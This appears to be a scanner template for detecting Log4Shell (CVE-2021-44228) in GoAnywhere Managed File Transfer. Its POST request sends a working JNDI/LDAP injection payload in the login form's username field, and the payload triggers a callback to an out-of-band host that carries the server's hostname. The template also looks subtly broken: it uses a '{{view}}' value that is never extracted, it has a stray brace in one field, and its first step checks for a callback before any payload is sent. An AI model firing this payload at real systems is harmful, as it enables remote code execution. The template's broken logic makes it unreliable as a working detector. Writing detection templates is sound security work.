id: goanywhere-mft-log4j-rce
brief:
    title: GoAnywhere Managed File Transfer - Remote Code Execution (Apache Log4j)
    by: pussycat0x
    level: critical
    about: GoAnywhere Managed File Transfer is vulnerable to a remote command execution (RCE) issue via the included Apache Log4j.
    label:
        - cve
        - cve2021
        - jndi
        - log4j
        - rce
        - oast
        - goanywhere
        - kev
        - vuln
    score: CVE-2021-44228 CVSS:10.0
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/goanywhere/auth/Login.xhtml'
      signs:
        - "on": word
          has:
            - dns
          in: interactsh_protocol
          need: all
    - verb: POST
      to:
        - '{{BaseURL}}/goanywhere/auth/Login.xhtml'
      head:
        Content-Type: application/x-www-form-urlencoded
        Origin: '{{RootURL}}'
        Referer: '{{RootURL}}/goanywhere/auth/Login.xhtml'
      body: formPanel%3AloginGrid%3Aname=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.name.{{interactsh-url}}}&formPanel%3AloginGrid%3Avalue_hinput=pass&formPanel%3AloginGrid%3Avalue={{view}}}&formPanel%3AloginGrid%3AloginButton=&loginForm_SUBMIT=1&javax.faces.ViewState={{view}}
      signs:
        - "on": word
          has:
            - dns
          in: interactsh_protocol
          need: all
